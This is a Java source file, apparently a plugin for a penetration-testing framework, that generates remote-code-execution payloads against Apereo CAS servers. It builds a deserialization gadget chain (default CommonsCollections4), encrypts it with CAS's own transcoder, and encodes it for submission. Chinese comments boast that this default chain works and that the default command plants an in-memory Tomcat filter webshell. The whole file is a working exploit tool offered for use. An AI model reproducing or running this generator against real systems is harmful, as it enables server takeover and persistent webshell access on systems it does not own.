package me.gv7.woodpecker.plugin.payloads;

import me.gv7.woodpecker.plugin.CasRCE;
import me.gv7.woodpecker.plugin.IArgs;
import me.gv7.woodpecker.plugin.IPayloadGenerator;
import me.gv7.woodpecker.plugin.IResultOutput;
import org.cryptacular.util.CodecUtil;
import org.jasig.spring.webflow.plugin.EncryptedTranscoder;
import ys.payloads.ObjectPayload;

import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class CasPayloadGenerate implements IPayloadGenerator {
    @Override
    public String getPayloadTabCaption() {
        return "CAS execute 反序列化生成器";
    }

    @Override
    public List<IArgs> getCutomArgs() {
        final List<IArgs> args = new ArrayList<IArgs>();
        final IArgs gadge = CasRCE.pluginHelper.createArgs();
        gadge.setName("gadge");
        gadge.setDefaultValue("CommonsCollections4");
        gadge.setDescription("cc链，默认用cc4就能打死");
        gadge.setMastSetup(true);
        args.add(gadge);

        final IArgs command = CasRCE.pluginHelper.createArgs();
        command.setName("command");
        command.setDefaultValue("advance:TomcatFilterWebshell");
        command.setDescription("可以使用advance:TomcatFilterWebshell 直接打内存shell");
        command.setMastSetup(true);
        args.add(command);
        return args;
    }

    @Override
    public void generatorPayload(Map<String, String> customArgs, IResultOutput iResultOutput) {
        String className = customArgs.get("gadge");
        String command = customArgs.get("command");
        iResultOutput.rawPrintln("\n\n调用类: "+className+"\ncommand: "+command+"\n");
        try {
            Object o = ObjectPayload.Utils.makePayloadObject(className, command);
            EncryptedTranscoder transcoder = new EncryptedTranscoder();
            byte[] aesEncoded = transcoder.encode(o);
            String b64Encoded = CodecUtil.b64(aesEncoded);
            String output = "67554b79-6cc1-4d89-a933-e99eb21a0ac2_"+b64Encoded;
            iResultOutput.successPrintln("TomcatFilterWebshell 设置头为 Accept-Languages 才能正常注入");
            iResultOutput.successPrintln(URLEncoder.encode(output));
        }catch (Exception e){
            iResultOutput.errorPrintln(e.getMessage());
            iResultOutput.errorPrintln(e.toString());
        }
    }
}
